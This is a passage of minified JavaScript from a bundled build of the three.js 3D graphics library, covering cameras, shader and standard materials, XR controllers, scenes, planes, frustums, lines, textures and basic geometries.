Fw={clone:Fr,merge:en};var Bw=`void main() {
	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
}`,zw=`void main() {
	gl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );
}`;class ui extends Wr{constructor(e){super(),this.isShaderMaterial=!0,this.type="ShaderMaterial",this.defines={},this.uniforms={},this.uniformsGroups=[],this.vertexShader=Bw,this.fragmentShader=zw,this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.clipping=!1,this.forceSinglePass=!0,this.extensions={clipCullDistance:!1,multiDraw:!1},this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv1:[0,0]},this.index0AttributeName=void 0,this.uniformsNeedUpdate=!1,this.glslVersion=null,e!==void 0&&this.setValues(e)}copy(e){return super.copy(e),this.fragmentShader=e.fragmentShader,this.vertexShader=e.vertexShader,this.uniforms=Fr(e.uniforms),this.uniformsGroups=Ow(e.uniformsGroups),this.defines=Object.assign({},e.defines),this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.fog=e.fog,this.lights=e.lights,this.clipping=e.clipping,this.extensions=Object.assign({},e.extensions),this.glslVersion=e.glslVersion,this.defaultAttributeValues=Object.assign({},e.defaultAttributeValues),this.index0AttributeName=e.index0AttributeName,this.uniformsNeedUpdate=e.uniformsNeedUpdate,this}toJSON(e){const n=super.toJSON(e);n.glslVersion=this.glslVersion,n.uniforms={};for(const s in this.uniforms){const a=this.uniforms[s].value;a&&a.isTexture?n.uniforms[s]={type:"t",value:a.toJSON(e).uuid}:a&&a.isColor?n.uniforms[s]={type:"c",value:a.getHex()}:a&&a.isVector2?n.uniforms[s]={type:"v2",value:a.toArray()}:a&&a.isVector3?n.uniforms[s]={type:"v3",value:a.toArray()}:a&&a.isVector4?n.uniforms[s]={type:"v4",value:a.toArray()}:a&&a.isMatrix3?n.uniforms[s]={type:"m3",value:a.toArray()}:a&&a.isMatrix4?n.uniforms[s]={type:"m4",value:a.toArray()}:n.uniforms[s]={value:a}}Object.keys(this.defines).length>0&&(n.defines=this.defines),n.vertexShader=this.vertexShader,n.fragmentShader=this.fragmentShader,n.lights=this.lights,n.clipping=this.clipping;const i={};for(const s in this.extensions)this.extensions[s]===!0&&(i[s]=!0);return Object.keys(i).length>0&&(n.extensions=i),n}}class e_ extends Gt{constructor(){super(),this.isCamera=!0,this.type="Camera",this.matrixWorldInverse=new _t,this.projectionMatrix=new _t,this.projectionMatrixInverse=new _t,this.coordinateSystem=ni,this._reversedDepth=!1}get reversedDepth(){return this._reversedDepth}copy(e,n){return super.copy(e,n),this.matrixWorldInverse.copy(e.matrixWorldInverse),this.projectionMatrix.copy(e.projectionMatrix),this.projectionMatrixInverse.copy(e.projectionMatrixInverse),this.coordinateSystem=e.coordinateSystem,this}getWorldDirection(e){return super.getWorldDirection(e).negate()}updateMatrixWorld(e){super.updateMatrixWorld(e),this.matrixWorldInverse.copy(this.matrixWorld).invert()}updateWorldMatrix(e,n){super.updateWorldMatrix(e,n),this.matrixWorldInverse.copy(this.matrixWorld).invert()}clone(){return new this.constructor().copy(this)}}const zi=new B,_m=new et,xm=new et;class un extends e_{constructor(e=50,n=1,i=.1,s=2e3){super(),this.isPerspectiveCamera=!0,this.type="PerspectiveCamera",this.fov=e,this.zoom=1,this.near=i,this.far=s,this.focus=10,this.aspect=n,this.view=null,this.filmGauge=35,this.filmOffset=0,this.updateProjectionMatrix()}copy(e,n){return super.copy(e,n),this.fov=e.fov,this.zoom=e.zoom,this.near=e.near,this.far=e.far,this.focus=e.focus,this.aspect=e.aspect,this.view=e.view===null?null:Object.assign({},e.view),this.filmGauge=e.filmGauge,this.filmOffset=e.filmOffset,this}setFocalLength(e){const n=.5*this.getFilmHeight()/e;this.fov=rp*2*Math.atan(n),this.updateProjectionMatrix()}getFocalLength(){const e=Math.tan(Vc*.5*this.fov);return .5*this.getFilmHeight()/e}getEffectiveFOV(){return rp*2*Math.atan(Math.tan(Vc*.5*this.fov)/this.zoom)}getFilmWidth(){return this.filmGauge*Math.min(this.aspect,1)}getFilmHeight(){return this.filmGauge/Math.max(this.aspect,1)}getViewBounds(e,n,i){zi.set(-1,-1,.5).applyMatrix4(this.projectionMatrixInverse),n.set(zi.x,zi.y).multiplyScalar(-e/zi.z),zi.set(1,1,.5).applyMatrix4(this.projectionMatrixInverse),i.set(zi.x,zi.y).multiplyScalar(-e/zi.z)}getViewSize(e,n){return this.getViewBounds(e,_m,xm),n.subVectors(xm,_m)}setViewOffset(e,n,i,s,r,a){this.aspect=e/n,this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=n,this.view.offsetX=i,this.view.offsetY=s,this.view.width=r,this.view.height=a,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const e=this.near;let n=e*Math.tan(Vc*.5*this.fov)/this.zoom,i=2*n,s=this.aspect*i,r=-.5*s;const a=this.view;if(this.view!==null&&this.view.enabled){const l=a.fullWidth,c=a.fullHeight;r+=a.offsetX*s/l,n-=a.offsetY*i/c,s*=a.width/l,i*=a.height/c}const o=this.filmOffset;o!==0&&(r+=e*o/this.getFilmWidth()),this.projectionMatrix.makePerspective(r,r+s,n,n-i,e,this.far,this.coordinateSystem,this.reversedDepth),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(e){const n=super.toJSON(e);return n.object.fov=this.fov,n.object.zoom=this.zoom,n.object.near=this.near,n.object.far=this.far,n.object.focus=this.focus,n.object.aspect=this.aspect,this.view!==null&&(n.object.view=Object.assign({},this.view)),n.object.filmGauge=this.filmGauge,n.object.filmOffset=this.filmOffset,n}}const ir=-90,sr=1;class Vw extends Gt{constructor(e,n,i){super(),this.type="CubeCamera",this.renderTarget=i,this.coordinateSystem=null,this.activeMipmapLevel=0;const s=new un(ir,sr,e,n);s.layers=this.layers,this.add(s);const r=new un(ir,sr,e,n);r.layers=this.layers,this.add(r);const a=new un(ir,sr,e,n);a.layers=this.layers,this.add(a);const o=new un(ir,sr,e,n);o.layers=this.layers,this.add(o);const l=new un(ir,sr,e,n);l.layers=this.layers,this.add(l);const c=new un(ir,sr,e,n);c.layers=this.layers,this.add(c)}updateCoordinateSystem(){const e=this.coordinateSystem,n=this.children.concat(),[i,s,r,a,o,l]=n;for(const c of n)this.remove(c);if(e===ni)i.up.set(0,1,0),i.lookAt(1,0,0),s.up.set(0,1,0),s.lookAt(-1,0,0),r.up.set(0,0,-1),r.lookAt(0,1,0),a.up.set(0,0,1),a.lookAt(0,-1,0),o.up.set(0,1,0),o.lookAt(0,0,1),l.up.set(0,1,0),l.lookAt(0,0,-1);else if(e===Bl)i.up.set(0,-1,0),i.lookAt(-1,0,0),s.up.set(0,-1,0),s.lookAt(1,0,0),r.up.set(0,0,1),r.lookAt(0,1,0),a.up.set(0,0,-1),a.lookAt(0,-1,0),o.up.set(0,-1,0),o.lookAt(0,0,1),l.up.set(0,-1,0),l.lookAt(0,0,-1);else throw new Error("THREE.CubeCamera.updateCoordinateSystem(): Invalid coordinate system: "+e);for(const c of n)this.add(c),c.updateMatrixWorld()}update(e,n){this.parent===null&&this.updateMatrixWorld();const{renderTarget:i,activeMipmapLevel:s}=this;this.coordinateSystem!==e.coordinateSystem&&(this.coordinateSystem=e.coordinateSystem,this.updateCoordinateSystem());const[r,a,o,l,c,d]=this.children,p=e.getRenderTarget(),h=e.getActiveCubeFace(),f=e.getActiveMipmapLevel(),_=e.xr.enabled;e.xr.enabled=!1;const y=i.texture.generateMipmaps;i.texture.generateMipmaps=!1,e.setRenderTarget(i,0,s),e.render(n,r),e.setRenderTarget(i,1,s),e.render(n,a),e.setRenderTarget(i,2,s),e.render(n,o),e.setRenderTarget(i,3,s),e.render(n,l),e.setRenderTarget(i,4,s),e.render(n,c),i.texture.generateMipmaps=y,e.setRenderTarget(i,5,s),e.render(n,d),e.setRenderTarget(p,h,f),e.xr.enabled=_,i.texture.needsPMREMUpdate=!0}}class t_ extends Zt{constructor(e=[],n=zs,i,s,r,a,o,l,c,d){super(e,n,i,s,r,a,o,l,c,d),this.isCubeTexture=!0,this.flipY=!1}get images(){return this.image}set images(e){this.image=e}}class n_ extends ai{constructor(e=1,n={}){super(e,e,n),this.isWebGLCubeRenderTarget=!0;const i={width:e,height:e,depth:1},s=[i,i,i,i,i,i];this.texture=new t_(s),this._setTextureOptions(n),this.texture.isRenderTargetTexture=!0}fromEquirectangularTexture(e,n){this.texture.type=n.type,this.texture.colorSpace=n.colorSpace,this.texture.generateMipmaps=n.generateMipmaps,this.texture.minFilter=n.minFilter,this.texture.magFilter=n.magFilter;const i={uniforms:{tEquirect:{value:null}},vertexShader:`

				varying vec3 vWorldDirection;

				vec3 transformDirection( in vec3 dir, in mat4 matrix ) {

					return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );

				}

				void main() {

					vWorldDirection = transformDirection( position, modelMatrix );

					#include <begin_vertex>
					#include <project_vertex>

				}
			`,fragmentShader:`

				uniform sampler2D tEquirect;

				varying vec3 vWorldDirection;

				#include <common>

				void main() {

					vec3 direction = normalize( vWorldDirection );

					vec2 sampleUV = equirectUv( direction );

					gl_FragColor = texture2D( tEquirect, sampleUV );

				}
			`},s=new wi(5,5,5),r=new ui({name:"CubemapFromEquirect",uniforms:Fr(i.uniforms),vertexShader:i.vertexShader,fragmentShader:i.fragmentShader,side:mn,blending:Ei});r.uniforms.tEquirect.value=n;const a=new Ot(s,r),o=n.minFilter;return n.minFilter===Ps&&(n.minFilter=Kt),new Vw(1,10,this).update(e,a),n.minFilter=o,a.geometry.dispose(),a.material.dispose(),this}clear(e,n=!0,i=!0,s=!0){const r=e.getRenderTarget();for(let a=0;a<6;a++)e.setRenderTarget(this,a),e.clear(n,i,s);e.setRenderTarget(r)}}class ks extends Gt{constructor(){super(),this.isGroup=!0,this.type="Group"}}const Hw={type:"move"};class cu{constructor(){this._targetRay=null,this._grip=null,this._hand=null}getHandSpace(){return this._hand===null&&(this._hand=new ks,this._hand.matrixAutoUpdate=!1,this._hand.visible=!1,this._hand.joints={},this._hand.inputState={pinching:!1}),this._hand}getTargetRaySpace(){return this._targetRay===null&&(this._targetRay=new ks,this._targetRay.matrixAutoUpdate=!1,this._targetRay.visible=!1,this._targetRay.hasLinearVelocity=!1,this._targetRay.linearVelocity=new B,this._targetRay.hasAngularVelocity=!1,this._targetRay.angularVelocity=new B),this._targetRay}getGripSpace(){return this._grip===null&&(this._grip=new ks,this._grip.matrixAutoUpdate=!1,this._grip.visible=!1,this._grip.hasLinearVelocity=!1,this._grip.linearVelocity=new B,this._grip.hasAngularVelocity=!1,this._grip.angularVelocity=new B),this._grip}dispatchEvent(e){return this._targetRay!==null&&this._targetRay.dispatchEvent(e),this._grip!==null&&this._grip.dispatchEvent(e),this._hand!==null&&this._hand.dispatchEvent(e),this}connect(e){if(e&&e.hand){const n=this._hand;if(n)for(const i of e.hand.values())this._getHandJoint(n,i)}return this.dispatchEvent({type:"connected",data:e}),this}disconnect(e){return this.dispatchEvent({type:"disconnected",data:e}),this._targetRay!==null&&(this._targetRay.visible=!1),this._grip!==null&&(this._grip.visible=!1),this._hand!==null&&(this._hand.visible=!1),this}update(e,n,i){let s=null,r=null,a=null;const o=this._targetRay,l=this._grip,c=this._hand;if(e&&n.session.visibilityState!=="visible-blurred"){if(c&&e.hand){a=!0;for(const y of e.hand.values()){const m=n.getJointPose(y,i),u=this._getHandJoint(c,y);m!==null&&(u.matrix.fromArray(m.transform.matrix),u.matrix.decompose(u.position,u.rotation,u.scale),u.matrixWorldNeedsUpdate=!0,u.jointRadius=m.radius),u.visible=m!==null}const d=c.joints["index-finger-tip"],p=c.joints["thumb-tip"],h=d.position.distanceTo(p.position),f=.02,_=.005;c.inputState.pinching&&h>f+_?(c.inputState.pinching=!1,this.dispatchEvent({type:"pinchend",handedness:e.handedness,target:this})):!c.inputState.pinching&&h<=f-_&&(c.inputState.pinching=!0,this.dispatchEvent({type:"pinchstart",handedness:e.handedness,target:this}))}else l!==null&&e.gripSpace&&(r=n.getPose(e.gripSpace,i),r!==null&&(l.matrix.fromArray(r.transform.matrix),l.matrix.decompose(l.position,l.rotation,l.scale),l.matrixWorldNeedsUpdate=!0,r.linearVelocity?(l.hasLinearVelocity=!0,l.linearVelocity.copy(r.linearVelocity)):l.hasLinearVelocity=!1,r.angularVelocity?(l.hasAngularVelocity=!0,l.angularVelocity.copy(r.angularVelocity)):l.hasAngularVelocity=!1));o!==null&&(s=n.getPose(e.targetRaySpace,i),s===null&&r!==null&&(s=r),s!==null&&(o.matrix.fromArray(s.transform.matrix),o.matrix.decompose(o.position,o.rotation,o.scale),o.matrixWorldNeedsUpdate=!0,s.linearVelocity?(o.hasLinearVelocity=!0,o.linearVelocity.copy(s.linearVelocity)):o.hasLinearVelocity=!1,s.angularVelocity?(o.hasAngularVelocity=!0,o.angularVelocity.copy(s.angularVelocity)):o.hasAngularVelocity=!1,this.dispatchEvent(Hw)))}return o!==null&&(o.visible=s!==null),l!==null&&(l.visible=r!==null),c!==null&&(c.visible=a!==null),this}_getHandJoint(e,n){if(e.joints[n.jointName]===void 0){const i=new ks;i.matrixAutoUpdate=!1,i.visible=!1,e.joints[n.jointName]=i,e.add(i)}return e.joints[n.jointName]}}class i_ extends Gt{constructor(){super(),this.isScene=!0,this.type="Scene",this.background=null,this.environment=null,this.fog=null,this.backgroundBlurriness=0,this.backgroundIntensity=1,this.backgroundRotation=new ci,this.environmentIntensity=1,this.environmentRotation=new ci,this.overrideMaterial=null,typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}copy(e,n){return super.copy(e,n),e.background!==null&&(this.background=e.background.clone()),e.environment!==null&&(this.environment=e.environment.clone()),e.fog!==null&&(this.fog=e.fog.clone()),this.backgroundBlurriness=e.backgroundBlurriness,this.backgroundIntensity=e.backgroundIntensity,this.backgroundRotation.copy(e.backgroundRotation),this.environmentIntensity=e.environmentIntensity,this.environmentRotation.copy(e.environmentRotation),e.overrideMaterial!==null&&(this.overrideMaterial=e.overrideMaterial.clone()),this.matrixAutoUpdate=e.matrixAutoUpdate,this}toJSON(e){const n=super.toJSON(e);return this.fog!==null&&(n.object.fog=this.fog.toJSON()),this.backgroundBlurriness>0&&(n.object.backgroundBlurriness=this.backgroundBlurriness),this.backgroundIntensity!==1&&(n.object.backgroundIntensity=this.backgroundIntensity),n.object.backgroundRotation=this.backgroundRotation.toArray(),this.environmentIntensity!==1&&(n.object.environmentIntensity=this.environmentIntensity),n.object.environmentRotation=this.environmentRotation.toArray(),n}}class Gw extends Zt{constructor(e=null,n=1,i=1,s,r,a,o,l,c=Vt,d=Vt,p,h){super(null,a,o,l,c,d,s,r,p,h),this.isDataTexture=!0,this.image={data:e,width:n,height:i},this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}const uu=new B,Ww=new B,jw=new Fe;class Ms{constructor(e=new B(1,0,0),n=0){this.isPlane=!0,this.normal=e,this.constant=n}set(e,n){return this.normal.copy(e),this.constant=n,this}setComponents(e,n,i,s){return this.normal.set(e,n,i),this.constant=s,this}setFromNormalAndCoplanarPoint(e,n){return this.normal.copy(e),this.constant=-n.dot(this.normal),this}setFromCoplanarPoints(e,n,i){const s=uu.subVectors(i,n).cross(Ww.subVectors(e,n)).normalize();return this.setFromNormalAndCoplanarPoint(s,e),this}copy(e){return this.normal.copy(e.normal),this.constant=e.constant,this}normalize(){const e=1/this.normal.length();return this.normal.multiplyScalar(e),this.constant*=e,this}negate(){return this.constant*=-1,this.normal.negate(),this}distanceToPoint(e){return this.normal.dot(e)+this.constant}distanceToSphere(e){return this.distanceToPoint(e.center)-e.radius}projectPoint(e,n){return n.copy(e).addScaledVector(this.normal,-this.distanceToPoint(e))}intersectLine(e,n){const i=e.delta(uu),s=this.normal.dot(i);if(s===0)return this.distanceToPoint(e.start)===0?n.copy(e.start):null;const r=-(e.start.dot(this.normal)+this.constant)/s;return r<0||r>1?null:n.copy(e.start).addScaledVector(i,r)}intersectsLine(e){const n=this.distanceToPoint(e.start),i=this.distanceToPoint(e.end);return n<0&&i>0||i<0&&n>0}intersectsBox(e){return e.intersectsPlane(this)}intersectsSphere(e){return e.intersectsPlane(this)}coplanarPoint(e){return e.copy(this.normal).multiplyScalar(-this.constant)}applyMatrix4(e,n){const i=n||jw.getNormalMatrix(e),s=this.coplanarPoint(uu).applyMatrix4(e),r=this.normal.applyMatrix3(i).normalize();return this.constant=-s.dot(r),this}translate(e){return this.constant-=e.dot(this.normal),this}equals(e){return e.normal.equals(this.normal)&&e.constant===this.constant}clone(){return new this.constructor().copy(this)}}const xs=new oc,Xw=new et(.5,.5),Wo=new B;class gh{constructor(e=new Ms,n=new Ms,i=new Ms,s=new Ms,r=new Ms,a=new Ms){this.planes=[e,n,i,s,r,a]}set(e,n,i,s,r,a){const o=this.planes;return o[0].copy(e),o[1].copy(n),o[2].copy(i),o[3].copy(s),o[4].copy(r),o[5].copy(a),this}copy(e){const n=this.planes;for(let i=0;i<6;i++)n[i].copy(e.planes[i]);return this}setFromProjectionMatrix(e,n=ni,i=!1){const s=this.planes,r=e.elements,a=r[0],o=r[1],l=r[2],c=r[3],d=r[4],p=r[5],h=r[6],f=r[7],_=r[8],y=r[9],m=r[10],u=r[11],g=r[12],x=r[13],S=r[14],T=r[15];if(s[0].setComponents(c-a,f-d,u-_,T-g).normalize(),s[1].setComponents(c+a,f+d,u+_,T+g).normalize(),s[2].setComponents(c+o,f+p,u+y,T+x).normalize(),s[3].setComponents(c-o,f-p,u-y,T-x).normalize(),i)s[4].setComponents(l,h,m,S).normalize(),s[5].setComponents(c-l,f-h,u-m,T-S).normalize();else if(s[4].setComponents(c-l,f-h,u-m,T-S).normalize(),n===ni)s[5].setComponents(c+l,f+h,u+m,T+S).normalize();else if(n===Bl)s[5].setComponents(l,h,m,S).normalize();else throw new Error("THREE.Frustum.setFromProjectionMatrix(): Invalid coordinate system: "+n);return this}intersectsObject(e){if(e.boundingSphere!==void 0)e.boundingSphere===null&&e.computeBoundingSphere(),xs.copy(e.boundingSphere).applyMatrix4(e.matrixWorld);else{const n=e.geometry;n.boundingSphere===null&&n.computeBoundingSphere(),xs.copy(n.boundingSphere).applyMatrix4(e.matrixWorld)}return this.intersectsSphere(xs)}intersectsSprite(e){xs.center.set(0,0,0);const n=Xw.distanceTo(e.center);return xs.radius=.7071067811865476+n,xs.applyMatrix4(e.matrixWorld),this.intersectsSphere(xs)}intersectsSphere(e){const n=this.planes,i=e.center,s=-e.radius;for(let r=0;r<6;r++)if(n[r].distanceToPoint(i)<s)return!1;return!0}intersectsBox(e){const n=this.planes;for(let i=0;i<6;i++){const s=n[i];if(Wo.x=s.normal.x>0?e.max.x:e.min.x,Wo.y=s.normal.y>0?e.max.y:e.min.y,Wo.z=s.normal.z>0?e.max.z:e.min.z,s.distanceToPoint(Wo)<0)return!1}return!0}containsPoint(e){const n=this.planes;for(let i=0;i<6;i++)if(n[i].distanceToPoint(e)<0)return!1;return!0}clone(){return new this.constructor().copy(this)}}class s_ extends Wr{constructor(e){super(),this.isLineBasicMaterial=!0,this.type="LineBasicMaterial",this.color=new Ie(16777215),this.map=null,this.linewidth=1,this.linecap="round",this.linejoin="round",this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.color.copy(e.color),this.map=e.map,this.linewidth=e.linewidth,this.linecap=e.linecap,this.linejoin=e.linejoin,this.fog=e.fog,this}}const Vl=new B,Hl=new B,ym=new _t,aa=new Y0,jo=new oc,du=new B,Sm=new B;class qw extends Gt{constructor(e=new An,n=new s_){super(),this.isLine=!0,this.type="Line",this.geometry=e,this.material=n,this.morphTargetDictionary=void 0,this.morphTargetInfluences=void 0,this.updateMorphTargets()}copy(e,n){return super.copy(e,n),this.material=Array.isArray(e.material)?e.material.slice():e.material,this.geometry=e.geometry,this}computeLineDistances(){const e=this.geometry;if(e.index===null){const n=e.attributes.position,i=[0];for(let s=1,r=n.count;s<r;s++)Vl.fromBufferAttribute(n,s-1),Hl.fromBufferAttribute(n,s),i[s]=i[s-1],i[s]+=Vl.distanceTo(Hl);e.setAttribute("lineDistance",new kt(i,1))}else Ne("Line.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");return this}raycast(e,n){const i=this.geometry,s=this.matrixWorld,r=e.params.Line.threshold,a=i.drawRange;if(i.boundingSphere===null&&i.computeBoundingSphere(),jo.copy(i.boundingSphere),jo.applyMatrix4(s),jo.radius+=r,e.ray.intersectsSphere(jo)===!1)return;ym.copy(s).invert(),aa.copy(e.ray).applyMatrix4(ym);const o=r/((this.scale.x+this.scale.y+this.scale.z)/3),l=o*o,c=this.isLineSegments?2:1,d=i.index,h=i.attributes.position;if(d!==null){const f=Math.max(0,a.start),_=Math.min(d.count,a.start+a.count);for(let y=f,m=_-1;y<m;y+=c){const u=d.getX(y),g=d.getX(y+1),x=Xo(this,e,aa,l,u,g,y);x&&n.push(x)}if(this.isLineLoop){const y=d.getX(_-1),m=d.getX(f),u=Xo(this,e,aa,l,y,m,_-1);u&&n.push(u)}}else{const f=Math.max(0,a.start),_=Math.min(h.count,a.start+a.count);for(let y=f,m=_-1;y<m;y+=c){const u=Xo(this,e,aa,l,y,y+1,y);u&&n.push(u)}if(this.isLineLoop){const y=Xo(this,e,aa,l,_-1,f,_-1);y&&n.push(y)}}}updateMorphTargets(){const n=this.geometry.morphAttributes,i=Object.keys(n);if(i.length>0){const s=n[i[0]];if(s!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let r=0,a=s.length;r<a;r++){const o=s[r].name||String(r);this.morphTargetInfluences.push(0),this.morphTargetDictionary[o]=r}}}}}function Xo(t,e,n,i,s,r,a){const o=t.geometry.attributes.position;if(Vl.fromBufferAttribute(o,s),Hl.fromBufferAttribute(o,r),n.distanceSqToSegment(Vl,Hl,du,Sm)>i)return;du.applyMatrix4(t.matrixWorld);const c=e.ray.origin.distanceTo(du);if(!(c<e.near||c>e.far))return{distance:c,point:Sm.clone().applyMatrix4(t.matrixWorld),index:a,face:null,faceIndex:null,barycoord:null,object:t}}const bm=new B,wm=new B;class Yw extends qw{constructor(e,n){super(e,n),this.isLineSegments=!0,this.type="LineSegments"}computeLineDistances(){const e=this.geometry;if(e.index===null){const n=e.attributes.position,i=[];for(let s=0,r=n.count;s<r;s+=2)bm.fromBufferAttribute(n,s),wm.fromBufferAttribute(n,s+1),i[s]=s===0?0:i[s-1],i[s+1]=i[s]+bm.distanceTo(wm);e.setAttribute("lineDistance",new kt(i,1))}else Ne("LineSegments.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");return this}}class $w extends Zt{constructor(e,n,i,s,r,a,o,l,c){super(e,n,i,s,r,a,o,l,c),this.isCanvasTexture=!0,this.needsUpdate=!0}}class Ya extends Zt{constructor(e,n,i=li,s,r,a,o=Vt,l=Vt,c,d=ki,p=1){if(d!==ki&&d!==Ls)throw new Error("DepthTexture format must be either THREE.DepthFormat or THREE.DepthStencilFormat");const h={width:e,height:n,depth:p};super(h,s,r,a,o,l,d,i,c),this.isDepthTexture=!0,this.flipY=!1,this.generateMipmaps=!1,this.compareFunction=null}copy(e){return super.copy(e),this.source=new fh(Object.assign({},e.image)),this.compareFunction=e.compareFunction,this}toJSON(e){const n=super.toJSON(e);return this.compareFunction!==null&&(n.compareFunction=this.compareFunction),n}}class Kw extends Ya{constructor(e,n=li,i=zs,s,r,a=Vt,o=Vt,l,c=ki){const d={width:e,height:e,depth:1},p=[d,d,d,d,d,d];super(e,e,n,i,s,r,a,o,l,c),this.image=p,this.isCubeDepthTexture=!0,this.isCubeTexture=!0}get images(){return this.image}set images(e){this.image=e}}class r_ extends Zt{constructor(e=null){super(),this.sourceTexture=e,this.isExternalTexture=!0}copy(e){return super.copy(e),this.sourceTexture=e.sourceTexture,this}}class ao extends An{constructor(e=1,n=1,i=1,s=1){super(),this.type="PlaneGeometry",this.parameters={width:e,height:n,widthSegments:i,heightSegments:s};const r=e/2,a=n/2,o=Math.floor(i),l=Math.floor(s),c=o+1,d=l+1,p=e/o,h=n/l,f=[],_=[],y=[],m=[];for(let u=0;u<d;u++){const g=u*h-a;for(let x=0;x<c;x++){const S=x*p-r;_.push(S,-g,0),y.push(0,0,1),m.push(x/o),m.push(1-u/l)}}for(let u=0;u<l;u++)for(let g=0;g<o;g++){const x=g+c*u,S=g+c*(u+1),T=g+1+c*(u+1),A=g+1+c*u;f.push(x,S,A),f.push(S,T,A)}this.setIndex(f),this.setAttribute("position",new kt(_,3)),this.setAttribute("normal",new kt(y,3)),this.setAttribute("uv",new kt(m,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new ao(e.width,e.height,e.widthSegments,e.heightSegments)}}class vh extends An{constructor(e=1,n=32,i=16,s=0,r=Math.PI*2,a=0,o=Math.PI){super(),this.type="SphereGeometry",this.parameters={radius:e,widthSegments:n,heightSegments:i,phiStart:s,phiLength:r,thetaStart:a,thetaLength:o},n=Math.max(3,Math.floor(n)),i=Math.max(2,Math.floor(i));const l=Math.min(a+o,Math.PI);let c=0;const d=[],p=new B,h=new B,f=[],_=[],y=[],m=[];for(let u=0;u<=i;u++){const g=[],x=u/i;let S=0;u===0&&a===0?S=.5/n:u===i&&l===Math.PI&&(S=-.5/n);for(let T=0;T<=n;T++){const A=T/n;p.x=-e*Math.cos(s+A*r)*Math.sin(a+x*o),p.y=e*Math.cos(a+x*o),p.z=e*Math.sin(s+A*r)*Math.sin(a+x*o),_.push(p.x,p.y,p.z),h.copy(p).normalize(),y.push(h.x,h.y,h.z),m.push(A+S,1-x),g.push(c++)}d.push(g)}for(let u=0;u<i;u++)for(let g=0;g<n;g++){const x=d[u][g+1],S=d[u][g],T=d[u+1][g],A=d[u+1][g+1];(u!==0||a>0)&&f.push(x,S,A),(u!==i-1||l<Math.PI)&&f.push(S,T,A)}this.setIndex(f),this.setAttribute("position",new kt(_,3)),this.setAttribute("normal",new kt(y,3)),this.setAttribute("uv",new kt(m,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new vh(e.radius,e.widthSegments,e.heightSegments,e.phiStart,e.phiLength,e.thetaStart,e.thetaLength)}}class $a extends An{constructor(e=1,n=.4,i=12,s=48,r=Math.PI*2){super(),this.type="TorusGeometry",this.parameters={radius:e,tube:n,radialSegments:i,tubularSegments:s,arc:r},i=Math.floor(i),s=Math.floor(s);const a=[],o=[],l=[],c=[],d=new B,p=new B,h=new B;for(let f=0;f<=i;f++)for(let _=0;_<=s;_++){const y=_/s*r,m=f/i*Math.PI*2;p.x=(e+n*Math.cos(m))*Math.cos(y),p.y=(e+n*Math.cos(m))*Math.sin(y),p.z=n*Math.sin(m),o.push(p.x,p.y,p.z),d.x=e*Math.cos(y),d.y=e*Math.sin(y),h.subVectors(p,d).normalize(),l.push(h.x,h.y,h.z),c.push(_/s),c.push(f/i)}for(let f=1;f<=i;f++)for(let _=1;_<=s;_++){const y=(s+1)*f+_-1,m=(s+1)*(f-1)+_-1,u=(s+1)*(f-1)+_,g=(s+1)*f+_;a.push(y,m,g),a.push(m,u,g)}this.setIndex(a),this.setAttribute("position",new kt(o,3)),this.setAttribute("normal",new kt(l,3)),this.setAttribute("uv",new kt(c,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new $a(e.radius,e.tube,e.radialSegments,e.tubularSegments,e.arc)}}class Zw extends ui{constructor(e){super(e),this.isRawShaderMaterial=!0,this.type="RawShaderMaterial"}}class ar extends Wr{constructor(e){super(),this.isMeshStandardMaterial=!0,this.type="MeshStandardMaterial",this.defines={STANDARD:""},this.color=new Ie(16777215),this.roughness=1,this.metalness=0,this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new Ie(0),this.emissiveIntensity=1,this.emissiveMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=j0,this.normalScale=new et(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.roughnessMap=null,this.metalnessMap=null,this.alphaMap=null,this.envMap=null,this.envMapRotation=new ci,this.envMapIntensity=1,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.flatShading=!1,this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.defines={STANDARD:""},this.color.copy(e.color),this.roughness=e.roughness,this.metalness=e.metalness,this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.roughnessMap=e.roughnessMap,this.metalnessMap=e.metalnessMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.envMapRotation.copy(e.envMapRotation),this.envMapIntensity=e.envMapIntensity,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.flatShading=e.flatShading,this.fog=e.fog,this}}class Jw extends 